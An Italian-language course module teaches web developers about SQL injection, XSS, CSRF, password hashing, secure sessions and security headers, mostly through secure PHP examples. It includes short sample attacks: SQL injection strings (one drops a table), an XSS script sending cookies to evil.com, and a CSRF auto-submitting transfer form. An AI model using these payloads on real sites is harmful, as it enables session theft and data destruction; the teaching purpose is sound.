Applicazioni Web

Vulnerabilità, attacchi e tecniche di difesa per sviluppatori web.

Perché la sicurezza conta

Una web app non sicura espone dati degli utenti, credenziali e dati aziendali. Gli attacchi più comuni sfruttano errori di programmazione — non falle del sistema operativo. Ogni sviluppatore deve conoscere le vulnerabilità base e come prevenirle.

OWASP (Open Web Application Security Project) pubblica annualmente la lista delle Top 10 vulnerabilità più critiche nelle applicazioni web, usata come riferimento mondiale.

Modulo 7 · Fondamenti

La triade CIA

Confidenzialità

Solo gli utenti autorizzati possono accedere alle informazioni. Strumenti: autenticazione, autorizzazione, cifratura (HTTPS), controllo degli accessi.

Integrità

I dati non vengono modificati in modo non autorizzato. Strumenti: checksum, firme digitali, vincoli DB, log delle modifiche, hashing.

Disponibilità

I servizi sono accessibili quando gli utenti ne hanno bisogno. Minacce: attacchi DDoS, guasti hardware. Strumenti: backup, ridondanza, CDN.

Concetti aggiuntivi

Autenticazione vs Autorizzazione

Autenticazione: verifica l'identità — "chi sei?". Esempi: login con username/password, token JWT, biometria.

Autorizzazione: verifica i permessi — "cosa puoi fare?". Esempi: ruoli (admin/user), ACL (Access Control List), permessi per risorsa.

Principio del minimo privilegio

Ogni utente, processo o componente dovrebbe avere solo i permessi strettamente necessari per svolgere la propria funzione, e niente di più.

Esempio: l'utente MySQL dell'applicazione web non dovrebbe avere permessi DROP TABLE o accesso ad altri database non necessari.

Modulo 7 · Vulnerabilità

SQL Injection

Come funziona l'attacco

SQL Injection avviene quando input non validato viene concatenato direttamente in una query SQL, permettendo all'attaccante di modificarne la logica.

Codice vulnerabile:

// PERICOLOSO — MAI fare così
$email = $_POST['email'];
$sql = "SELECT * FROM utenti
        WHERE email = '$email'";
// Se email = ' OR '1'='1
// La query diventa:
// WHERE email = '' OR '1'='1'
// → restituisce TUTTI gli utenti!

Input malevolo:

// Esempi di input malevolo:

' OR '1'='1        → bypass login
'; DROP TABLE utenti; --  → cancella tabella
' UNION SELECT * FROM admin --  → espone dati
admin'--           → commenta il resto SQL
Difesa — Prepared Statements

L'unica difesa affidabile è separare struttura SQL e dati tramite prepared statements:

// SICURO — prepared statement con MySQLi
$stmt = $conn->prepare(
    "SELECT * FROM utenti WHERE email = ?"
);
// Il ? è un segnaposto — MAI concatenare
$stmt->bind_param("s", $email);  // "s" = string
$stmt->execute();
$result = $stmt->get_result();
$user = $result->fetch_assoc();

// Il driver MySQL tratta $email come PURO DATO,
// non può mai diventare codice SQL.
// SICURO — con PDO (alternativa)
$stmt = $pdo->prepare(
    "SELECT * FROM utenti WHERE email = :email"
);
$stmt->bindParam(':email', $email);
$stmt->execute();
$user = $stmt->fetch();

Regola d'oro

MAI costruire query SQL concatenando variabili. Usare SEMPRE prepared statements per qualsiasi valore che proviene da input utente, URL, cookie o qualsiasi fonte esterna.

Modulo 7 · Vulnerabilità

XSS e CSRF

XSS — Cross-Site Scripting

XSS inietta JavaScript malevolo nell'HTML della pagina. Quando altri utenti caricano la pagina, il codice si esegue nel loro browser.

// Commento utente con XSS
<script>
  // Ruba il cookie di sessione
  fetch('https://evil.com?c='
    + document.cookie);
</script>

Difesa PHP: htmlspecialchars() prima di stampare qualsiasi dato utente:

// PRIMA di stampare nell'HTML:
echo htmlspecialchars(
    $input,
    ENT_QUOTES,
    'UTF-8'
);
// Converte: < → &lt;  > → &gt;
//           " → &quot;  ' → &#039;
// Il tag <script> diventa testo innocuo.

Difesa JS: usare textContent invece di innerHTML per inserire testo utente nel DOM.

CSRF — Cross-Site Request Forgery

Il browser della vittima autenticata viene indotto a inviare richieste non volute a un sito dove è loggata.

<!-- evil.com contiene form nascosto -->
<form action="https://banca.com/bonifico"
      method="POST">
  <input name="importo" value="1000">
  <input name="destinatario" value="hacker">
</form>
<script>document.forms[0].submit();</script>

Difesa: token CSRF univoco per sessione, verificato lato server:

// Generare token CSRF in PHP
session_start();
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(
        random_bytes(32)
    );
}

// Nel form HTML:
// <input type="hidden" name="csrf_token"
//   value="<?= $_SESSION['csrf_token'] ?>">

// Verifica lato server:
if ($_POST['csrf_token'] !==
    $_SESSION['csrf_token']) {
    die('CSRF token non valido');
}

Anche SameSite=Strict nei cookie previene CSRF: il browser non invia il cookie per richieste cross-site.

Modulo 7 · Autenticazione

Password e Sessioni

Hashing sicuro delle password

Le password non vanno mai memorizzate in chiaro nel database. Usare sempre bcrypt tramite le funzioni PHP native:

// REGISTRAZIONE
$hash = password_hash(
    $password,
    PASSWORD_BCRYPT
);
// $hash include salt casuale automatico
// Esempio: $2y$10$AbCdEf...
// Salva $hash nel database

// LOGIN (verifica)
$stored_hash = /* leggi dal DB */;
if (password_verify($password, $stored_hash)) {
    // Autenticazione riuscita
    session_start();
    session_regenerate_id(true); // IMPORTANTE
    $_SESSION['user_id'] = $user['id'];
    header('Location: dashboard.php');
} else {
    echo 'Credenziali non valide';
}
MAI usare md5(), sha1() o sha256() per le password. Sono troppo veloci — una GPU può testare miliardi di hash al secondo. bcrypt è progettato per essere lento.

Perché bcrypt è sicuro

  • Salt casuale automatico — protegge da rainbow table attack
  • Lento per design (cost factor) — resiste a brute force
  • Adattativo: il cost factor può aumentare col tempo
  • password_verify() è resistente a timing attack
Sessioni sicure in PHP
session_start(); // PRIMA di qualsiasi output

// Dopo login riuscito — SEMPRE rigenerare l'ID
session_regenerate_id(true); // previene session fixation
$_SESSION['user_id'] = $user_id;
$_SESSION['login_time'] = time();

// Configurazione cookie sicuri (in php.ini o runtime):
ini_set('session.cookie_httponly', 1);  // JS non può leggere il cookie
ini_set('session.cookie_secure', 1);    // solo HTTPS
ini_set('session.cookie_samesite', 'Strict'); // previene CSRF

// Timeout manuale (es. 30 minuti)
if (isset($_SESSION['login_time'])) {
    if (time() - $_SESSION['login_time'] > 1800) {
        session_destroy(); // sessione scaduta
        header('Location: login.php');
        exit;
    }
}

// Logout
session_destroy(); // elimina la sessione lato server
Modulo 7 · Trasporto e Header

HTTPS e Security Headers

HTTPS e TLS

HTTPS usa TLS (Transport Layer Security) per crittografare tutto il traffico tra browser e server. Garantisce tre proprietà:

  • Confidenzialità: nessuno può intercettare e leggere il traffico
  • Integrità: nessuno può modificare i dati in transito
  • Autenticazione: il certificato digitale verifica l'identità del server

SSL è il predecessore deprecato di TLS. TLS 1.2 e 1.3 sono le versioni attuali. SSL 2.0 e 3.0 sono insicuri e disabilitati.

In sviluppo locale vs produzione

In locale: HTTP è accettabile per lo sviluppo. In produzione: HTTPS è obbligatorio per qualsiasi sito che gestisce dati utente, login o pagamenti. Let's Encrypt offre certificati TLS gratuiti.

Security Headers
// Aggiungere header di sicurezza in PHP:

// HSTS: forza HTTPS per 1 anno
header('Strict-Transport-Security: max-age=31536000; includeSubDomains');

// CSP: limita le fonti di script (previene XSS)
header("Content-Security-Policy: default-src 'self'; script-src 'self'");

// Impedisce il sito di essere caricato in iframe (clickjacking)
header('X-Frame-Options: DENY');

// Impedisce al browser di indovinare il MIME type
header('X-Content-Type-Options: nosniff');

// Nasconde informazioni sul server
header_remove('X-Powered-By'); // rimuove "PHP/8.x"
Defense in depth — sicurezza a strati
Layer 1
Validazione input
Validazione client (JS) per UX + validazione server (PHP) per sicurezza. Whitelist dei valori consentiti dove possibile.
Layer 2
Prepared statements
MAI concatenare input in SQL. Ogni query con parametri utente usa bind_param().
Layer 3
Output escaping
htmlspecialchars() prima di stampare dati utente nell'HTML. textContent in JS.
Layer 4
HTTPS + header sicuri
TLS per crittografare il traffico. HSTS, CSP, X-Frame-Options per proteggere il browser.
Layer 5
Autenticazione sicura
bcrypt per le password, sessioni con HttpOnly+Secure, session_regenerate_id dopo login, timeout.
